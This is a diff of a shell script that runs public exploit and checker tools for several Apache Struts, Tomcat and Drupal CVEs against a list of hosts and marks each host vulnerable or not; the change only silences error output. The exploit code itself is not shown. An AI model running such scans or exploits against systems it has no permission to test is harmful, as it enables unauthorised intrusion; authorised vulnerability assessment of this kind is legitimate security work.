@@ -8,7 +8,7 @@ echo "-------------$line-----------------------"
 
 #CVE-2017-5638
 echo 'CVE-2017-5638:'
-v1=$(python cve/struts-pwn/struts-pwn.py --check --url $line | grep 'Status:')
+v1=$(python cve/struts-pwn/struts-pwn.py --check --url $line  2>/dev/null| grep 'Status:')
 if [ "${v1}" != '[*] Status: Not Affected.' ] ;then
 echo "
 ------------Vulnerable!---------------------------------------------------
@@ -25,7 +25,7 @@ fi
 
 #CVE-2017-9805
 echo 'CVE-2017-9805:'
-v2=$(python cve/struts-pwn_CVE-2017-9805/struts-pwn.py --url $line | grep 'Status:')
+v2=$(python cve/struts-pwn_CVE-2017-9805/struts-pwn.py --url $line 2>/dev/null | grep 'Status:')
 if [ "${v2}" != '[*] Status: Not Affected.' ] ;then
 echo "
 ------------Vulnerable!---------------------------------------------------
@@ -41,7 +41,7 @@ fi
 
 #CVE-2018-11776
 echo 'CVE-2018-11776:'
-v3=$(python cve/struts-pwn_CVE-2018-11776/struts-pwn.py --url $line | grep 'Status:')
+v3=$(python cve/struts-pwn_CVE-2018-11776/struts-pwn.py --url $line 2>/dev/null | grep 'Status:')
 if [ "${v3}" != '[*] Status: Not Affected.' ] ;then
 echo "
 ------------Vulnerable!---------------------------------------------------
@@ -57,7 +57,7 @@ fi
 
 #CVE-2017-12617
 echo 'CVE-2017-12617:'
-v4=$(timeout --signal=SIGINT 5 python cve/Tomcat-CVE-2017-12617.py -u http://$line | grep 'http')
+v4=$(timeout --signal=SIGINT 5 python cve/Tomcat-CVE-2017-12617.py -u http://$line 2>/dev/null | grep 'http')
 if [ -z  "${v4}" ] ;then
 echo -e "\033[1;33m[*] Status: Not Affected.\e[0m"
 
@@ -75,7 +75,7 @@ fi
 
 #CVE-2018-7600
 echo 'CVE-2018-7600:'
-v5=$(ruby cve/Drupalgeddon2-CVE-2018-7600.rb https://$line | grep "[+] Good News Everyone!" 
+v5=$(ruby cve/Drupalgeddon2-CVE-2018-7600.rb https://$line 2>/dev/null  | grep "[+] Good News Everyone!" 
 )
 if [ -z "${v5}"  ] ;then
 echo -e "\033[1;33m[*] Status: Not Affected.\e[0m"
